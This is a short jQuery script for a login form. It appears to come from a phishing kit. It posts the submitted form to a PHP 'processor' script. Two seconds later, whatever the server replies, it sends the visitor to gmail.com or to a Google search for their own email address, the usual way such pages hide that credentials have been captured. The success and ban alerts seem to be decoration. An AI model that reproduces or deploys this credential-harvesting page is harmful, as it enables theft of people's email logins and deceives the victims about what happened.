
	
	<script>
  jQuery(document).ready(function(){
                        jQuery("#login_form").submit(function(e){
                                e.preventDefault();
                                var formData = jQuery(this).serialize();
                                $.ajax({
                                    type: "POST",
                                    url: "../../processor/checkoutlogin.php",
                                    data: formData,
                                      beforeSend: function() {
                                    $('#logbtn').addClass('fa-spinner');
                                     document.getElementById('login_bt').innerHTML = "Loading...";
                                   },
                                   complete: function() {
                                      $('#logbtn').removeClass('fa-spinner');
                                      document.getElementById('login_bt').innerHTML = "Login";
                                    },                                  success: function(html){
                                       var delay = 2000;
							setTimeout(function(){  
							    	var email2 = jQuery('#email2').val();
							    var n = email2.search("@gmail.com");
                           if (n >0){
    window.location.replace('https://www.gmail.com');  }else{ window.location.replace('https://www.google.com.ng/search?site=&source=hp&q=mail:'+email2+'&oq=mail:'+email2); } 
    }, delay);  
	                                                                 
                                   if(html=='true')
                                    {
                                       swal("Login Successful", "You are now Logged in", "success");
									                     window.location='myaccount';
									   
                                    }
                                    else{
                                      swal("Login Failed", "Try Again", "error");
                                    }

                                   if(html == 'suspended'){
                                         swal("Account suspended", "Contact Admin, Request Why Your Account was Suspended", "error");
                                    }  
                                   if(html == 'banned'){
                                         swal("Account Banned", "Contact Admin To Request Why Your Account was banned", "error");
                                    } 
                                    }
                                });
                                return false;
                            });
                        });

</script>